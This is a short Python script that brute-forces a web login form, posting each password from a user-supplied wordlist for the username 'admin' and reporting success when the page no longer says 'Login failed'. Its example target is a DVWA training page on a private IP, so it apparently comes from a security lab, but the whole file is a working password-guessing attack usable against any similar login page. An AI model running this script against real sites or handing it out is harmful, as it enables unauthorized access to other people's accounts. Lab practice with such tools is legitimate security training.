import requests
import os
import sys
from urllib.parse import urlparse

def validate_url(url):
    """Check if the URL is valid."""
    parsed = urlparse(url)
    return all([parsed.scheme, parsed.netloc])

def main():
    target_url = input("Enter the target login URL (e.g., http://192.168.112.131/dvwa/login.php): ").strip()
    wordlist_path = input("Enter the full path to your wordlist file: ").strip()

    if not validate_url(target_url):
        print("[-] Invalid URL. Please include http:// or https:// and a valid domain/IP.")
        sys.exit(1)

    if not os.path.isfile(wordlist_path):
        print(f"[-] Wordlist file not found: {wordlist_path}")
        sys.exit(1)

    data_dict = {"username": "admin", "password": "", "Login": "submit"}

    with open(wordlist_path, "r") as wordlist_file:
        for line in wordlist_file:
            word = line.strip()
            data_dict["password"] = word
            try:
                response = requests.post(target_url, data=data_dict)
            except requests.exceptions.RequestException as e:
                print(f"[-] Request failed: {e}")
                sys.exit(1)

            if b"Login failed" not in response.content:
                print(f"[+] Password found: {word}")
                return

    print("[-] Password not found in the provided wordlist.")

if __name__ == "__main__":
    main()

